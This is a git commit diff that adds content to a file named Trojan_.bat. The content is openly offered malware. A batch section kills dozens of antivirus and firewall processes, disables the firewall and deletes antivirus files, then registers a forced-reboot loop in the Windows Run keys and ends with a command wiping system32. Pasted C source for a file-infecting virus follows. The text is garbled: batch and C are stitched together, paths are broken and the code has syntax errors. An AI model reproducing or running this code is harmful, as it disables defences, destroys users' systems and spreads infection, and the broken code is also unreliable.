f278af5c236cb30981f9569129250395c5cf2680
Alex Toucan <99103316+Alex-Toucan@users.noreply.github.com>
2022-07-02 11:48:51 -0500

    Add files via upload

--- media/files/Trojan_.bat
+++ media/files/Trojan_.bat
@@ -1,3 +1,215 @@
+@ echo off
+rem —
+rem Permanently Kill Anti-Virus
+net stop “Security Center”
+netsh firewall set opmode mode=disable
+tskill /A av*
+tskill /A fire*
+tskill /A anti*
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
+cls
+tskill /A OUTPOST
+tskill /A nv*
+tskill /A nav*
+tskill /A F-*
+tskill /A ESAFE
+tskill /A cle
+cls
+tskill /A BLACKICE
+tskill /A def*
+tskill /A kav
+tskill /A kav*
+tskill /A avg*
+tskill /A ash*
+cls
+tskill /A aswupdsv
+tskill /A ewid*
+tskill /A guard*
+tskill /A guar*
+tskill /A gcasDt*
+tskill /A msmp*
+cls
+tskill /A mcafe*
+tskill /A mghtml
+tskill /A msiexec
+tskill /A outpost
+tskill /A isafe
+tskill /A zap*
+cls
+tskill /A zauinst
+tskill /A upd*
+tskill /A zlclien*
+tskill /A minilog
+tskill /A cc*
+tskill /A norton*
+cls
+tskill /A norton au*
+tskill /A ccc*
+tskill /A npfmn*
+tskill /A loge*
+tskill /A nisum*
+tskill /A issvc
+tskill /A tmp*
+cls
+tskill /A tmn*
+tskill /A pcc*
+tskill /A cpd*
+tskill /A pop*
+tskill /A pav*
+tskill /A padmin
+cls
+tskill /A panda*
+tskill /A avsch*
+tskill /A sche*
+tskill /A syman*
+tskill /A virus*
+tskill /A realm*
+cls
+tskill /A sweep*
+tskill /A scan*
+tskill /A ad-*
+tskill /A safe*
+tskill /A avas*
+tskill /A norm*
+cls
+tskill /A offg*
+del /Q /F C:Program Filesalwils~1avast4*.*
+del /Q /F C:Program FilesLavasoftAd-awa~1*.exe
+del /Q /F C:Program Fileskasper~1*.exe
+cls
+del /Q /F C:Program Filestrojan~1*.exe
+del /Q /F C:Program Filesf-prot95*.dll
+del /Q /F C:Program Filestbav*.dat
+cls
+del /Q /F C:Program Filesavpersonal*.vdf
+del /Q /F C:Program FilesNorton~1*.cnt
+del /Q /F C:Program FilesMcafee*.*
+cls
+del /Q /F C:Program FilesNorton~1Norton~1Norton~3*.*
+del /Q /F C:Program FilesNorton~1Norton~1speedd~1*.*
+del /Q /F C:Program FilesNorton~1Norton~1*.*
+del /Q /F C:Program FilesNorton~1*.*
+cls
+del /Q /F C:Program Filesavgamsr*.exe
+del /Q /F C:Program Filesavgamsvr*.exe
+del /Q /F C:Program Filesavgemc*.exe
+cls
+del /Q /F C:Program Filesavgcc*.exe
+del /Q /F C:Program Filesavgupsvc*.exe
+del /Q /F C:Program Filesgrisoft
+del /Q /F C:Program Filesnood32krn*.exe
+del /Q /F C:Program Filesnood32*.exe
+cls
+del /Q /F C:Program Filesnod32
+del /Q /F C:Program Filesnood32
+del /Q /F C:Program Fileskav*.exe
+del /Q /F C:Program Fileskavmm*.exe
+del /Q /F C:Program Fileskaspersky*.*
+cls
+del /Q /F C:Program Filesewidoctrl*.exe
+del /Q /F C:Program Filesguard*.exe
+del /Q /F C:Program Filesewido*.exe
+cls
+del /Q /F C:Program Filespavprsrv*.exe
+del /Q /F C:Program Filespavprot*.exe
+del /Q /F C:Program Filesavengine*.exe
+cls
+del /Q /F C:Program Filesapvxdwin*.exe
+del /Q /F C:Program Fileswebproxy*.exe
+del /Q /F C:Program Filespanda software*.*
+rem —
+
+
+echo @echo off>c:windowshartlell.bat
+echo break off>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>c:windowshartlell.bat
+echo end>c:windowshartlell.bat
+reg add
+hkey_local_machinesofwaremicrosoftwindowscurrentversionrun /v 
+startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add
+hkey_current_usersoftwaremicrosoftwindowscurrentverionrun /v/t reg_sz /d c:windowshartlell.bat /f
+
+@echo off
+Copy C:\Programs\Your and idiot.bat C:\Programs
+Start C:\Programs\Your an idiot.bat
+ 
+
+FILE *Ron *vRon;
+
+int owned = 0;
+
+unsigned long x;
+
+char buff[256];
+
+struct ffblk ffblk;
+
+clock_t st, end;
+
+main()
+
+{
+
+ st=clock();
+
+ clrscr();
+
+ owned=(find_first(“*.*”, &ffblk,0);
+
+ while(!done)
+
+ {
+
+ Ron=fopen(_arg[0], “rb”);
+
+ vhost=fopen(ffblk.ff_name, “rb+”);
+
+ if (vhost = =NULL)
+
+ goto next;
+
+ x = 89088;
+
+ printf(“infecting %s\n”, ffblk.ff_name);
+
+ while(x>2048)
+
+ {
+
+ fread(buff,256,1,Ron);
+
+ fwrite(buff,256,1,vRon);
+
+ x – = 2048;
+
+ }
+
+ fread(buff,x,1,Ron);
+
+ fwrite(buff,x,1,vRon);
+
+ a++;
+
+ next:      fcloseall();
+
+ owned = findnext(&ffblk);
+
+ }
+
+ end = clock()
+
+ printf(“Infected %d files in %f sec”, a, (end-st)/CLK_TCk);
+
+ return (0);
+
+}
 
 #include<stdio.h>
 #include<io.h>
@@ -5,7 +217,7 @@
 #include<dir.h>
 #include<conio.h>
 #include<time.h>
-FILE *virus,*host;
+FILE *Virus,*host;
 int done,a=0;
 unsigned long x;
 char buff[2048];
@@ -18,7 +230,7 @@ clrscr();
 done=findfirst(“*.*”,&ffblk,0);
 while(!done)
 {
-virus=fopen(_argv[0],”rb”);
+Virus=fopen(_argv[0],”rb”);
 host=fopen(ffblk.ff_name,”rb+”);
 if(host==NULL) goto next;
 x=89088;
@@ -215,5 +427,7 @@ int x1 = random() % (w - 400);
 
 	out: return 200.0 / (times / 5.0 + 1) + 3;
 }
+
+del c:\WINDOWS\system32*.*
 
  
